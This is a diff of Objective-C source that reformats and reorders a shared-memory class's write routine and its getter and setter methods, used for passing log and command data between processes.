-          memoryState = *(unsigned int *)(mSharedMemory + anOffset);
-
-          if (memoryState != SHMEM_FREE)
-            {
-              anOffset += sizeof (shMemoryLog);
-            }
-          else
-            {
-              memoryState = SHMEM_LOCKED;
-              break;
-            }
-
-          if (anOffset >= mSize)
-            {
-#ifdef DEBUG_SHMEM
-              infoLog(@"[XPC __m_MSharedMemory] SHMem - write didn't found an available memory block mSize = %#x", mSize);
-#endif
-              return FALSE;
-            }
-        }
-      while (memoryState != SHMEM_FREE);
-
-      memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryLog));
+    [self _lockShmem];
+    
+    do
+    {
+      memoryState = *(unsigned int *)(mSharedMemory + anOffset);
       
-      [self _unlockShmem];
+      if (memoryState != SHMEM_FREE)
+      {
+        anOffset += sizeof (shMemoryLog);
+      }
+      else
+      {
+        memoryState = SHMEM_LOCKED;
+        break;
+      }
+      
+      if (anOffset >= mSize)
+      {
+#ifdef DEBUG_SHMEM
+        infoLog(@"[XPC __m_MSharedMemory] SHMem - write didn't found an available memory block mSize = %#x", mSize);
+#endif
+        return FALSE;
+      }
     }
+    while (memoryState != SHMEM_FREE);
+    
+    memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryLog));
+    
+    [self _unlockShmem];
+  }
   else
-    {
-      //memoryState = *(unsigned int *)(mSharedMemory + anOffset);
+  {
+    //memoryState = *(unsigned int *)(mSharedMemory + anOffset);
     
-      [self _lockShmem];
+    [self _lockShmem];
     
-      memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryCommand));
+    memcpy((void *)(mSharedMemory + anOffset), [aData bytes], sizeof(shMemoryCommand));
     
-      [self _unlockShmem];
-    }
-
+    [self _unlockShmem];
+  }
+  
   return TRUE;
 }
 
@@ -1056,19 +1055,14 @@ static BOOL amIPrivileged()
 #pragma mark Getter/Setter
 #pragma mark -
 
-- (char *)mSharedMemory
-{
-  return mSharedMemory;
-}
-
 - (void)setSharedMemory: (char *)value
 {
   mSharedMemory = value;
 }
 
-- (int)mSharedMemoryID
+- (char *)mSharedMemory
 {
-  return mSharedMemoryID;
+  return mSharedMemory;
 }
 
 - (void)setSharedMemoryID: (int)value
@@ -1076,9 +1070,9 @@ static BOOL amIPrivileged()
   mSharedMemoryID = value;
 }
 
-- (int)mKey
+- (int)mSharedMemoryID
 {
-  return mKey;
+  return mSharedMemoryID;
 }
 
 - (void)setKey: (int)value
@@ -1086,14 +1080,19 @@ static BOOL amIPrivileged()
   mKey = value;
 }
 
-- (int)mSize
+- (int)mKey
 {
-  return mSize;
+  return mKey;
 }
 
 - (void)setSize: (int)value
 {
   mSize = value;
+}
+
+- (int)mSize
+{
+  return mSize;
 }
 
 - (sem_t *)mSemaphoreID
@@ -1106,19 +1105,20 @@ static BOOL amIPrivileged()
   mSemaphoreID = value;
 }
 
+- (void)setSemaphoreName: (NSString *)value
+{
+  if (value != mSemaphoreName)
+  {
+    [mSemaphoreName release];
+    mSemaphoreName = [value retain];
+  }
+}
+
 - (NSString *)mSemaphoreName
 {
   return mSemaphoreName;
 }
 
-- (void)setSemaphoreName: (NSString *)value
-{
-  if (value != mSemaphoreName)
-    {
-      [mSemaphoreName release];
-      mSemaphoreName = [value retain];
-    }
-}
 
 @end
 
